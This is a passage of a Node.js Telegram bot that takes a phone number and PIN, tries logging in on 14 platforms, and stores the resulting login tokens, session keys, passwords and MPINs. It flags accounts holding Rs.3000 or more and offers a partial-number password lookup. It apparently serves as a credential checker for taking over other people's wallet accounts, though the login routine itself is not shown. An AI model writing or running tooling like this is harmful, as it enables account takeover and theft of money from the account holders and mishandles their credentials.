        await ctx.editMessageText(`${f.emoji} *${r.siteName}*\n📱 \`${r.phone}\`\n👤 ID: \`${r.loginData.userId}\`\n💰 ${f.text}`, { parse_mode: 'Markdown' });
        if (f.num >= 3000) ctx.reply('🚨 HIGH BALANCE!\n' + r.siteName + '\n📱 `' + r.phone + '`\n💰 Rs.' + r.bal, { parse_mode: 'Markdown' });
    } else {
        ctx.editMessageText('❌ *' + r.siteName + '* fail!\n📱 `' + r.phone + '`\n' + r.errMsg, { parse_mode: 'Markdown' });
    }
});

bot.action(/^edt_p_(.+)$/, function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var phone = ctx.match[1];
    var buttons = [[Markup.button.callback('📱 Mobile Update', 'edt_type_num_' + phone)], [Markup.button.callback('🔒 Pin/Code Update', 'edt_type_pass_' + phone)]];
    ctx.editMessageText('📱 `' + phone + '` mein kya update karna hai?', Markup.inlineKeyboard(buttons));
});

bot.action(/^edt_type_(num|pass)_(.+)$/, function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var type = ctx.match[1];
    var phone = ctx.match[2];
    userState[ctx.chat.id] = { step: type === 'num' ? 'edit_num' : 'edit_pass', targetPhone: phone };
    if (type === 'num') ctx.reply('Naya *Mobile* bhejo (Purana: `' + phone + '`):', { parse_mode: 'Markdown' });
    else ctx.reply('Naya *Pin/Code* bhejo (Number: `' + phone + '`):', { parse_mode: 'Markdown' });
});

// ==========================================
// 💬 TEXT HANDLER
// ==========================================
bot.on('text', async function (ctx, next) {
    var chatId = ctx.chat.id;
    var text = ctx.message.text.trim();
    if (text.startsWith('/')) return next();
    var state = userState[chatId];
    if (!state) return next();

    // ✅ UPDATED PASSWORD SEARCH LOGIC (Separate Copyable Lines)
    if (state.step === 'get_password') {
        clearState(ctx);
        var query = text.replace(/\D/g, '');
        if (query.length < 4) return ctx.reply('❌ Kam se kam 4 digit daalo.');

        var wallets = loadWallets();
        var matched = Object.values(wallets).filter(w => w.phone.includes(query));

        if (matched.length === 0) return ctx.reply('❌ `' + query + '` se koi number nahi mila!', { parse_mode: 'Markdown' });

        var byPhone = {};
        matched.forEach(w => { if (!byPhone[w.phone]) byPhone[w.phone] = w.password; });

        var msg = '🔑 *Password Lookup:*\n\n';
        Object.keys(byPhone).forEach(phone => {
            msg += `📱 *Mobile Number:*\n\`${phone}\`\n\n🔑 *Password:*\n\`${byPhone[phone]}\`\n\n${formatMpinLookup(matched.filter(w => w.phone === phone), SITES)}━━━━━━━━━━━━━━━━━\n\n`;
        });
        msg += '_Upar number, password aur saved MPIN par alag-alag tap karke copy kar sakte ho_';

        return ctx.reply(msg, { parse_mode: 'Markdown' });
    }

    if (state.step === 'add_phone') {
        userState[chatId].phone = text;
        userState[chatId].step = 'add_password';
        return ctx.reply('🔒 *Ab Pin / Code bhejo:*', { parse_mode: 'Markdown' });
    }
    if (state.step === 'add_password') {
        userState[chatId].password = text;
        userState[chatId].step = 'waiting_click';
        var buttons = [];
        var siteKeys = Object.keys(SITES);
        for (var i = 0; i < siteKeys.length; i += 2) {
            var row = [Markup.button.callback('🌐 ' + SITES[siteKeys[i]].name, 'add_s_' + siteKeys[i])];
            if (siteKeys[i + 1]) row.push(Markup.button.callback('🌐 ' + SITES[siteKeys[i + 1]].name, 'add_s_' + siteKeys[i + 1]));
            buttons.push(row);
        }
        return ctx.reply('📱 *Number:* `' + userState[chatId].phone + '`\n👇 *Kaunsi App?*', Markup.inlineKeyboard(buttons));
    }
    if (state.step === 'awaiting_scan_phone') {
        userState[chatId].phone = text;
        userState[chatId].step = 'awaiting_scan_password';
        return ctx.reply('🔒 *Ab Pin / Code bhejo:*', { parse_mode: 'Markdown' });
    }
    if (state.step === 'awaiting_scan_password') {
        var phone = state.phone;
        var password = text;
        clearState(ctx);
        var siteKeys = Object.keys(SITES);
        var statusMsg = await ctx.reply('⏳ *14 Platforms check shuru...*', { parse_mode: 'Markdown' });
        var wallets = loadWallets();
        var entries = siteKeys.map(siteId => ({ siteId, phone, password, wKey: siteId + '_' + phone }));
        var results = await runGroupedChecks(entries);
        var successCount = 0;
        var highAlerts = [];
        var report = '🔍 *Report (`' + phone + '`)*\n\n';
        results.forEach(r => {
            if (r.success) {
                wallets[r.siteId + '_' + phone] = { siteId: r.siteId, phone, password, userId: r.loginData.userId, loginToken: r.loginData.loginToken, sessionKey: r.loginData.sessionKey, ...preserveMpin(wallets[r.siteId + '_' + phone]), addedAt: new Date().toISOString() };
                var f = formatBal(r.bal);
                report += `${f.emoji} *${r.siteName}*\n📱 \`${phone}\` | 👤 \`${r.loginData.userId}\` | 💰 ${f.text}\n\n`;
                if (f.num >= 3000) highAlerts.push(r);
                successCount++;
            } else {
                report += `❌ *${r.siteName}*\n📱 \`${phone}\` | ${r.errMsg}\n\n`;
            }
        });
        saveWallets(wallets);
        report += '💾 *' + successCount + ' entries save ho gayi!*';
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, report, { parse_mode: 'Markdown' }).catch(async () => {
            await splitAndSend(ctx, report);
        });
        if (highAlerts.length > 0) {
            var alertMsg = '🚨 *HIGH BALANCE ALERT* 🚨\n\n';
            highAlerts.forEach(r => { alertMsg += `🌐 *${r.siteName}*\n📱 \`${r.phone}\`\n💰 Rs.${r.bal}\n\n`; });
            await ctx.reply(alertMsg, { parse_mode: 'Markdown' });
        }
        await ctx.reply('━━━━━━━━━━━━━━━━━\n' + MENU_TEXT, { parse_mode: 'Markdown' });
        return;
    }
    if (state.step === 'edit_num') {
        var oldPhone = state.targetPhone;
        var newPhone = text;
        var wallets = loadWallets();
        var count = 0;
        Object.keys(wallets).forEach(key => {
            if (wallets[key].phone === oldPhone) {
                var w = wallets[key];
                w.phone = newPhone;
                wallets[w.siteId + '_' + newPhone] = w;
                delete wallets[key];
                count++;
            }
        });
        saveWallets(wallets);
        clearState(ctx);
        return ctx.reply('✅ ' + count + ' jagah update!\nNaya: `' + newPhone + '`', { parse_mode: 'Markdown' });
    }
    if (state.step === 'edit_pass') {
        var phoneToEdit = state.targetPhone;
        var newPass = text;
        var wallets = loadWallets();
        var count = 0;
        Object.keys(wallets).forEach(key => {
            if (wallets[key].phone === phoneToEdit) { wallets[key].password = newPass; count++; }
        });
        saveWallets(wallets);
        clearState(ctx);
        return ctx.reply('✅ `' + phoneToEdit + '` ka code update ho gaya!', { parse_mode: 'Markdown' });
    }
});

// ==========================================
// 🔄 RESTART COMMAND (Bot Atak Jaye Toh)
// ==========================================
bot.command('restart', function (ctx) {
    ctx.reply('⚠️ Kya aap bot ko Reset/Restart karna chahte hain? (Agar bot atak gaya hai toh ye sab free kar dega)', 
        Markup.inlineKeyboard([
            [Markup.button.callback('✅ Haan, Restart Karo', 'confirm_restart')],
            [Markup.button.callback('❌ Nahi, Cancel', 'cancel_restart')]
        ])
    );
});

bot.action('confirm_restart', function (ctx) {
    ctx.answerCbQuery().catch(() => {});
    userState = {}; // Har tarah ke locks aur atakne waale processes ko hata dega
    ctx.editMessageText('🔄 Bot Successfully Reset! Naye commands ab smoothly kaam karenge!').catch(()=>{});
});

bot.action('cancel_restart', function (ctx) {
    ctx.answerCbQuery().catch(() => {});
    ctx.editMessageText('❌ Restart cancel kar diya gaya.').catch(()=>{});
});

console.log('🤖 Master Bot (v11.0 SUPER-FAST + RELIABLE) start ho raha hai...');
bot.launch().then(function () { console.log('✅ Bot ONLINE! 14 sites configured.'); }).catch(function (err) { console.error('Bot connection failed'); process.exit(1); });
process.once('SIGINT', function () { bot.stop('SIGINT'); });
process.once('SIGTERM', function () { bot.stop('SIGTERM'); });
